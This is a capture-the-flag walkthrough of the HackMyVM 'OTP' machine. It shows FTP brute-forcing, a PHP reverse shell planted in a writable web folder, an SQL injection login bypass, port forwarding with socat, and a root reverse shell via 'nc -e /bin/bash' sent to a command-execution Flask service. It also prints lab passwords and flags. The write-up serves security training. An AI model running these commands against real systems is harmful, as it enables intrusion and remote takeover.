# OTP-Writeup-HackMyVM-Walkthrough

OTP is a difficult machine by the user avijneyam in the HackMyVM platform. By that, I mean there are many steps that one needs to perform to get to the root user. As usual, this machine works well on VirtualBox. “OTP Writeup – HackMyVM – Walkthrough”.

Link to the machine: https://hackmyvm.eu/machines/machine.php?vm=OTP

# 01 descover ip vm

Firstly, I got the IP address of the machine using netdiscover.

## Ping scan
```bash
sudo netdiscover 
```
# 02 scane ip 
## nmap 

```bash
──(root💀K4liR4t)-[~/Documents/HACK_MY_VM/Hard/otp]
└─# nmap -A -p- otp.hmv
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-22 16:09 EST
Nmap scan report for otp.hmv (192.168.1.34)
Host is up (0.00050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.51
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.51 (Debian)
MAC Address: 08:00:27:86:C6:76 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: Host: 127.0.0.1; OS: Unix

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms otp.hmv (192.168.1.34)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.65 seconds
```

# 03 Vhost enumeration

## use ffuf
```bash
┌──(root💀K4liR4t)-[~/Documents/HACK_MY_VM/Hard/otp]
└─# ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'HOST: FUZZ.otp.hmv' -u http://192.168.1.34 -fs 11202

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.34
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.otp.hmv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 11202
________________________________________________

argon                   [Status: 200, Size: 25537, Words: 9965, Lines: 627]
:: Progress: [4989/4989] :: Job [1/1] :: 529 req/sec :: Duration: [0:00:11] :: Errors: 0 ::

```

## Edit file /etc/hosts

```bash
192.168.1.34 	otp.hmv argon.otp.hmv
```
Next, I opened the website on the new domain that is pretty much static. However, there is a “login.php” script on the site.

Now, we need the username and the password. This information is available in the “User profile” section.

After this, I logged in to the website to see a username that I won’t write it here.

## login to page login.php

otpuser
#4ck!ng!s!nMybl0od

user:david

# 04 Bruteforce FTP

After finding the username, I bruteforced the FTP server.

```bash
┌──(root💀K4liR4t)-[~/Documents/HACK_MY_VM/Hard/otp]
└─# hydra -l david -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.34Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-22 17:18:01
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://192.168.1.34:21/
[STATUS] 256.00 tries/min, 256 tries in 00:01h, 14344143 to do in 933:52h, 16 active
[STATUS] 255.67 tries/min, 767 tries in 00:03h, 14343632 to do in 935:03h, 16 active
[STATUS] 264.57 tries/min, 1852 tries in 00:07h, 14342547 to do in 903:31h, 16 active
[STATUS] 262.93 tries/min, 3944 tries in 00:15h, 14340455 to do in 909:01h, 16 active
[21][ftp] host: 192.168.1.34   login: david   password: DAVID
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-22 17:39:56
```

This gives us the password for the user we found.

# 05 Log in to the FTP server

```bash
┌──(root💀K4liR4t)-[~/Documents/HACK_MY_VM/Hard/otp]
└─# ftp 192.168.1.34
Connected to 192.168.1.34.
220 (vsFTPd 3.0.3)
Name (192.168.1.34:root): david
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||48168|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001          125 Nov 19 08:41 important_note.txt
226 Directory send OK.
ftp> pwd
Remote directory: /srv/ftp
ftp> cd /etc/apache2/sites-available/
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||57066|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1228 Nov 21 03:44 000-default.conf
-rw-r--r--    1 0        0            1125 Nov 22 11:25 argon.conf
-rw-r--r--    1 0        0            6338 Aug 08  2020 default-ssl.conf
-rw-r--r--    1 0        0            1123 Nov 22 12:19 totp.conf
226 Directory send OK.
ftp> get argon.conf
local: argon.conf remote: argon.conf
229 Entering Extended Passive Mode (|||13974|)
150 Opening BINARY mode data connection for argon.conf (1125 bytes).
100% |************************************************|  1125       10.83 MiB/s    00:00 ETA
226 Transfer complete.
1125 bytes received in 00:00 (1.15 MiB/s)
ftp> get totp.conf
local: totp.conf remote: totp.conf
229 Entering Extended Passive Mode (|||43429|)
150 Opening BINARY mode data connection for totp.conf (1123 bytes).
100% |************************************************|  1123       14.47 MiB/s    00:00 ETA
226 Transfer complete.
1123 bytes received in 00:00 (980.92 KiB/s)

```
I get 2 file conf in /etc/apache2/sites-available/

```bash
<VirtualHost *:80>
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	ServerName argon.otp.hmv

	#ServerAdmin webmaster@localhost
	DocumentRoot /var/www/otp/argon
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```
```bash
<VirtualHost *:80>
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	ServerName totp.otp.hmv

	#ServerAdmin webmaster@localhost
	DocumentRoot /var/www/otp/totp
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```
So, I checked these two directories. On the argon directory, we have another folder “u9l04d_” that has full access.

```bash
ftp> ls
229 Entering Extended Passive Mode (|||64352|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             404 Feb 05  2020 CHANGELOG.md
-rw-r--r--    1 0        0             384 Feb 05  2020 ISSUE_TEMPLATE.md
-rw-r--r--    1 0        0            1101 Feb 05  2020 LICENSE.md
-rw-r--r--    1 0        0           12363 Feb 05  2020 README.md
drwxr-xr-x    8 0        0            4096 Feb 05  2020 assets
-rw-r--r--    1 0        0             221 Nov 22 10:15 cr3d5_123.html
drwxr-xr-x    2 0        0            4096 Feb 05  2020 docs
-rw-r--r--    1 0        0             856 Feb 05  2020 gulpfile.js
-rw-r--r--    1 0        0           25537 Nov 22 10:18 index.html
-rw-r--r--    1 0        0            7554 Nov 22 10:38 login.php
-rw-r--r--    1 0        0            1280 Feb 05  2020 package.json
-rw-r--r--    1 0        0           19070 Nov 22 10:33 profile.html
-rw-r--r--    1 0        0           50995 Nov 22 10:36 tables.html
drwxrwxrwx    2 0        1001         4096 Nov 23 04:39 u9l04d_
226 Directory send OK.
ftp> cd u9l04d_
ftp> put rev.php
local: rev.php remote: rev.php
229 Entering Extended Passive Mode (|||19650|)
150 Ok to send data.
100% |************************************************|   247        1.24 MiB/s    00:00 ETA
226 Transfer complete.
247 bytes sent in 00:00 (170.10 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||25922|)
150 Here comes the directory listing.
-rw-------    1 1001     1001          247 Dec 22 17:55 rev.php
226 Directory send OK.
```
In this reverse shell, I have entered my IP address and port information. Thus, I will listen on port 9001 (which is the same on the reverse shell file).

```bash
┌──(root💀K4liR4t)-[~/Documents/HACK_MY_VM/Hard/otp]
└─# nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.1.35] from (UNKNOWN) [192.168.1.34] 45562
bash: cannot set terminal process group (1018): Inappropriate ioctl for device
bash: no job control in this shell
www-data@otp:/var/www/otp/argon/u9l04d_$ 
```
```bash
┌──(root💀K4liR4t)-[~/Documents/HACK_MY_VM/Hard/otp]
└─# curl http://argon.otp.hmv/u9l04d_/rev.php
```

```bash
www-data@otp:/opt$ cat creds.sql 
-- MariaDB dump 10.19  Distrib 10.5.12-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: otp
-- ------------------------------------------------------
-- Server version       10.5.12-MariaDB-0+deb11u1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `creds`
--

DROP TABLE IF EXISTS `creds`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `creds` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `totp` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `creds`
--

LOCK TABLES `creds` WRITE;
/*!40000 ALTER TABLE `creds` DISABLE KEYS */;
INSERT INTO `creds` VALUES (1,'','','NYZXMM3SI4YG43RUI4QXMM3ZGBKXKUAK');
/*!40000 ALTER TABLE `creds` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2021-11-20 10:46:17
www-data@otp:/opt$
```
```bash
┌──(root💀K4liR4t)-[~/Documents/HACK_MY_VM/Hard/otp]
└─# echo "NYZXMM3SI4YG43RUI4QXMM3ZGBKXKUAK" |base32 -d
n3v3rG0nn4G!v3y0UuP
```
# 07 totp.otp.hmv
Then, I opened totp.otp.hmv to find a login page that I could bypass using the following input.

SQL injection input
' OR 1=1 -- -
Then, it asks for the OTP but we can also bypass this using the same above query. However, the creator didn’t intend this. I guess he wants us to use an authenticator extension to generate OTP from the totp we found earlier. Anyway, we get the following screen.
We get a portion of the password for the user. Then, we have an instruction to decode. So, we can use the base32 that we decoded in place of those asterisks. Lastly, we have payloads that are the machines’ names from the HackMyVM platform. I copied those and replaces “\n” with a new line.

## format the file
```bash
# the -i flag replaces the same file
sed -i 's/\\n/\n/g' payloads
```
avijneyam:n3v3rG0nn4G!v3y0UuP___Cuz_HackMyVM_iS_theRe_Only_4_y0u_:)

# 08 Switch to the user avijneyam


```bash
www-data@otp:/home$ su -l avijneyam
Password: 
avijneyam@otp:~$ sudo -l
[sudo] password for avijneyam: 
Matching Defaults entries for avijneyam on otp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User avijneyam may run the following commands on otp:
    (root) PASSWD: /bin/bash /root/localhost.sh
    ```
```bash
avijneyam@otp:~$ cat flag_user.txt 
2990aa5108d5803f3fdca99c277ba352
```
Here, the user can run a command that looks like a webserver.

## run the server

```bash
avijneyam@otp:~$ sudo bash /root/localhost.sh
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
```
As I said before, this is a python server running on port 5000. So, I sent this job to the background using Ctrl+Z and listed the listening ports.

```bash
avijneyam@otp:~$ ss -tnlp
State        Recv-Q       Send-Q             Local Address:Port               Peer Address:Port       Process       
LISTEN       0            128                    127.0.0.1:5000                    0.0.0.0:*                        
LISTEN       0            80                     127.0.0.1:3306                    0.0.0.0:*                        
LISTEN       0            32                             *:21                            *:*                        
LISTEN       0            511                            *:80                            *:*                   
```
We can see that the port is listening at 127.0.0.1:5000. This means that we cannot access it from our Kali Linux machine. Had this been 0.0.0.0:5000 or *:5000, we could access this.

```bash
┌──(root💀K4liR4t)-[~/Documents/HACK_MY_VM/Hard/otp]
└─# nmap -v -T4 -p 5000 192.168.1.34
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-22 18:36 EST
Initiating ARP Ping Scan at 18:36
Scanning 192.168.1.34 [1 port]
Completed ARP Ping Scan at 18:36, 0.13s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:36
Scanning otp.hmv (192.168.1.34) [1 port]
Completed SYN Stealth Scan at 18:36, 0.03s elapsed (1 total ports)
Nmap scan report for otp.hmv (192.168.1.34)
Host is up (0.00066s latency).

PORT     STATE  SERVICE
5000/tcp closed upnp
MAC Address: 08:00:27:86:C6:76 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
           Raw packets sent: 2 (72B) | Rcvd: 2 (68B)
```
# 09 Enumerate the python webserver

```bash
avijneyam@otp:~$ socat tcp-listen:5001,fork tcp:127.0.0.1:5000 &
[1] 1362448
avijneyam@otp:~$ ss -tnlp
State     Recv-Q    Send-Q       Local Address:Port       Peer Address:Port   Process                               
LISTEN    0         128              127.0.0.1:5000            0.0.0.0:*                                            
LISTEN    0         5                  0.0.0.0:5001            0.0.0.0:*       users:(("socat",pid=1362448,fd=5))   
LISTEN    0         80               127.0.0.1:3306            0.0.0.0:*                                            
LISTEN    0         32                       *:21                    *:*                                            
LISTEN    0         511                      *:80                    *:*                                            
```
Finally, I could expose the service.

```bash
┌──(root💀K4liR4t)-[~/Documents/HACK_MY_VM/Hard/otp]
└─# nmap -v -T4 -p 5001 192.168.1.34
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-22 18:38 EST
Initiating ARP Ping Scan at 18:38
Scanning 192.168.1.34 [1 port]
Completed ARP Ping Scan at 18:38, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:38
Scanning otp.hmv (192.168.1.34) [1 port]
Discovered open port 5001/tcp on 192.168.1.34
Completed SYN Stealth Scan at 18:38, 0.03s elapsed (1 total ports)
Nmap scan report for otp.hmv (192.168.1.34)
Host is up (0.00046s latency).

PORT     STATE SERVICE
5001/tcp open  commplex-link
MAC Address: 08:00:27:86:C6:76 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)
```
Then, I performed a gobuster scan on the server.

## perform gobuster scan

```bash
┌──(root💀K4liR4t)-[~/Documents/HACK_MY_VM/Hard/otp]
└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://192.168.1.34:5001
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.34:5001
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/12/22 18:39:25 Starting gobuster
===============================================================
/SourceCode (Status: 200)
Progress: 10444 / 87665 (11.91%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2021/12/22 18:41:14 Finished
===============================================================
```
I got a path /SourceCode that has a base64 encoded text.
### The source code of the server

```bash
┌──(root💀K4liR4t)-[~/Documents/HACK_MY_VM/Hard/otp]
└─# curl http://192.168.1.34:5001/SourceCode | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1216  100  1216    0     0   103k      0 --:--:-- --:--:-- --:--:--  107k
from subprocess import Popen, TimeoutExpired, PIPE
from flask import Flask, jsonify, abort, request

app = Flask(__name__)

@app.route("/", methods=[""])
def index():
    req_json = request.get_json()
    if req_json is None or "" not in req_json:
        abort(400, description="Please provide command in JSON request!")
    proc = Popen(req_json[""], stdout=PIPE, stderr=PIPE, shell=True)
    try:
        outs, errs = proc.communicate(timeout=1)
    except TimeoutExpired:
        proc.kill()
        abort(500, description="The timeout is expired!")
    if errs:
        abort(500, description=errs.decode('utf-8'))
    return jsonify(success=True, message=outs.decode('utf-8'))

@app.errorhandler(400)
def bad_request(error):
    return jsonify(success=False, message=error.description), 400

@app.errorhandler(500)
def server_error(error):
    return jsonify(success=False, message=error.description) , 500
```
Here, we can see that we have to provide a command in a certain key in a JSON body request. Combining with the information we have previously, i.e. payloads, we can guess, that’s the way to move ahead. So, these lines of code are only similar to that of the running webserver.

Since there is a traditional netcat running on the webserver, we can use it to spawn the reverse shell. I will be listening on port 9001 once again.

Also, only PUT request is allowed on the server.
### Allowed methods
```bash
┌──(root💀K4liR4t)-[~/Documents/HACK_MY_VM/Hard/otp]
└─# curl -i -X OPTIONS http://192.168.1.34:5001
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Allow: OPTIONS, PUT
Content-Length: 0
Server: Werkzeug/2.0.2 Python/3.9.2
Date: Wed, 22 Dec 2021 23:43:36 GMT
```
Next, I used ffuf to bruteforce payloads as follows. For the correct payload, it is going to spawn a reverse shell.
### bruteforce the payloads

```bash
┌──(root💀K4liR4t)-[~/Documents/HACK_MY_VM/Hard/otp]
└─# ffuf -c -w payloads -u http://otp.hmv:5001/ -X PUT -H 'Content-Type: application/json' -d '{"FUZZ": "nc -e /bin/bash 192.168.1.35 1337"}'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : PUT
 :: URL              : http://otp.hmv:5001/
 :: Wordlist         : FUZZ: payloads
 :: Header           : Content-Type: application/json
 :: Data             : {"FUZZ": "nc -e /bin/bash 192.168.1.35 1337"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

:: Progress: [130/130] :: Job [1/1] :: 251 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
``` 
At some point, I got the shell.

### reverse shell as root
```bash
┌──(root💀K4liR4t)-[~/Documents/HACK_MY_VM/Hard/otp]
└─# nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.1.35] from (UNKNOWN) [192.168.1.34] 38480
id
uid=0(root) gid=0(root) groups=0(root)


flag_r00t.txt
8a2d55707a9084982649dadc04b426a0
```
